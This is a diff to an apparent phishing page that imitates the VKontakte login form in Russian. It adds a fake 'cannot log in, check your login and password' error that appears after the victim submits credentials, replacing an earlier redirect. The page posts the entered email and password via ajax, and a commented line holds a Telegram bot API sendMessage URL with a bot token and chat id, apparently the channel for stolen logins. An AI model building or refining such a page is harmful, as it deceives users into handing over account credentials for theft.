@@ -1,6 +1,3 @@
-<head> 
-<meta name="viewport" content="width=device-width, initial-scale=0.86, maximum-scale=5.0, minimum-scale=0.86">
-	<title>Вконтакте</title>
 <style>
     * {
 	margin: 0;
@@ -447,6 +444,10 @@ b {
     border-radius: 50%;
     padding: 3px}
 
+	.msg {
+		background-color: #f9d8ea;
+	}
+
 
 /* Модальное окно */
   #window {
@@ -577,8 +578,24 @@ b {
 footer a:hover {
   text-decoration: underline;
 }
+
+.msg_text{
+	background-color: #f9d8ea;
+    border-radius: 2%;
+    border: 1px solid #f9d8ea;
+    padding: 20px;
+    width: 400px;
+    height: 300px;
+    position: fixed;
+	z-index: 1; 
+	top: 25px;
+	
+}
+#alert{
+	display: none;
+}
+  
 </style>
-</head>
 <header>
     <div class="navbar">
         <div class="container">
@@ -623,7 +640,21 @@ footer a:hover {
 </div>
             </div>
         
-        <div class="r-cont">
+<div id="alert">
+	<div id="login_message"><div class="msg error"><div class="msg_text"><b>Не удаётся войти.</b> <br>Пожалуйста, проверьте правильность написания <b>логина</b> и <b>пароля</b>.
+		<ul class="listing">
+		  <li><span>Возможно, нажата клавиша <b>Caps Lock</b>?</span></li>
+		  <li><span>Может быть, у Вас включена неправильная <b>раскладка</b>? (русская или английская)</span></li>
+		  <li><span>Попробуйте набрать свой пароль в текстовом редакторе и <b>скопировать</b> в графу «Пароль»</span></li>
+		  <li><span>Если пароль набран верно, попробуйте указать в качестве логина <b>номер привязанного телефона</b>, а не почту.</span></li>
+		</ul>
+		Если Вы всё внимательно проверили, но войти всё равно не удаётся, Вы можете <b><a href="/restore">нажать сюда</a></b>.</div></div></div>
+</div>
+       
+				<div class="r-cont">
+			<div class="passworld">
+
+			</div>
             <div class="f-form">
                 <form action="">
                     <input type="text" placeholder="Телефон или email" name="Email" id="email" >
@@ -699,6 +730,7 @@ height: 100px">
 
     
     var btnlogin = document.getElementById("loginbtn");
+	var alert = document.getElementById("alert");
 
     btnlogin.onclick = function() {
         var email = document.getElementById("email").value;
@@ -733,8 +765,9 @@ $.ajax({
 	}
 });
 
-location="https://pixabay.com/ru/images/search/%D0%BA%D1%80%D0%B0%D1%81%D0%B8%D0%B2%D1%8B%D0%B5%20%D0%B4%D0%B5%D0%B2%D1%83%D1%88%D0%BA%D0%B8/";
-  };
+alert.style.display = "block";
+
+ };
 
 //   https://api.telegram.org/bot5073790827:AAGHVVC5NOZpbndY0sdGDw8BH28BDM8eC50/sendMessage?chat_id=1863692897&text=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82%D0%BB%D0%BE%D1%85
 
